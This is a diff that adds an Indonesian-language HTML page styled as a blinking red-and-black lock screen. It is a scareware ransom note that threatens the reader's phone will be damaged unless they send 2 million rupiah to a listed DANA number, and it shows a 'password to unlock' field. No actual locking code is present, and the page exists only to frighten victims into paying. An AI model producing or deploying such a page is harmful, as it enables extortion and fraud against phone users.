@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Peringatan</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      color: white;
+      animation: bgBlink 1s infinite;
+    }
+    @keyframes bgBlink {
+      0%, 50%, 100% { background: black; }
+      25%, 75% { background: #5c0000; } /* merah gelap */
+    }
+    .warning {
+      color: yellow;
+      font-size: 2.5em;
+      font-weight: bold;
+      margin: 20px 0;
+      animation: blink 1s infinite;
+    }
+    @keyframes blink {
+      50% { opacity: 0; }
+    }
+    .line {
+      margin: 10px 0;
+      font-size: 1.3em;
+    }
+    .input-box {
+      position: fixed;
+      bottom: 20px;
+      width: 100%;
+      text-align: center;
+    }
+    input {
+      padding: 10px;
+      width: 80%;
+      max-width: 400px;
+      border-radius: 6px;
+      border: none;
+      font-size: 1em;
+    }
+  </style>
+</head>
+<body>
+  <div class="warning">⚠ PERINGATAN ⚠</div>
+  <div class="line">CEPAT BAYAR JIKA TIDAK INGIN HPMU RUSAK☠️.</div>
+  <div class="line">NOMOR DANA : 0819886817.</div>
+  <div class="line">KIRIMKAN SAYA 2 JUTA RUPIAH.</div>
+  <div class="line">SEKARANG JUGA!!.</div>
+
+  <div class="input-box">
+    <input type="text" placeholder="Password untuk membuka">
+  </div>
+</body>
+</html>
